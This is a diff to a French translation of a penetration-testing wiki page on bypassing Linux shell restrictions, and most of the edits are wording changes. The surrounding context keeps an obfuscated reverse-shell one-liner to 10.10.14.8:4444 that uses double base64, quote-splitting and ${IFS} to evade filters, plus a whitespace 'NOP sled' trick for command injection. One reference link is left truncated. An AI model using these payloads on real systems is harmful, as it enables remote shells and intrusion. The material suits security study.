@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Short Rev shell
+### Shell Rev courte
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -310,7 +310,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Bash NOP Sled basé sur l'espace ("Bashsledding")
 
-Lorsqu'une vulnérabilité vous permet de contrôler partiellement un argument qui atteint finalement `system()` ou un autre shell, vous ne connaissez peut-être pas le décalage exact à partir duquel l'exécution commence à lire votre charge utile. Les NOP sleds traditionnels (par exemple, `\x90`) ne fonctionnent **pas** dans la syntaxe shell, mais Bash ignorera sans danger les espaces vides en tête avant d'exécuter une commande.
+Lorsqu'une vulnérabilité vous permet de contrôler partiellement un argument qui atteint finalement `system()` ou un autre shell, vous ne connaissez peut-être pas le décalage exact à partir duquel l'exécution commence à lire votre charge utile. Les NOP sleds traditionnels (par exemple, `\x90`) ne fonctionnent **pas** dans la syntaxe shell, mais Bash ignorera sans danger les espaces vides en début de ligne avant d'exécuter une commande.
 
 Par conséquent, vous pouvez créer un *NOP sled pour Bash* en préfixant votre vraie commande avec une longue séquence d'espaces ou de caractères de tabulation :
 ```bash
@@ -326,14 +326,14 @@ Cas d'utilisation pratiques :
 2. Situations où l'attaquant ne peut pas écrire de bytes NULL pour aligner la charge utile.
 3. Dispositifs embarqués où seul BusyBox `ash`/`sh` est disponible – ils ignorent également les espaces de début.
 
-> 🛠️  Combinez cette astuce avec des gadgets ROP qui appellent `system()` pour augmenter considérablement la fiabilité de l'exploitation sur des routeurs IoT à mémoire contrainte.
+> 🛠️  Combinez cette astuce avec des gadgets ROP qui appellent `system()` pour augmenter considérablement la fiabilité de l'exploitation sur des routeurs IoT à mémoire limitée.
 
 ## Références & Plus
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
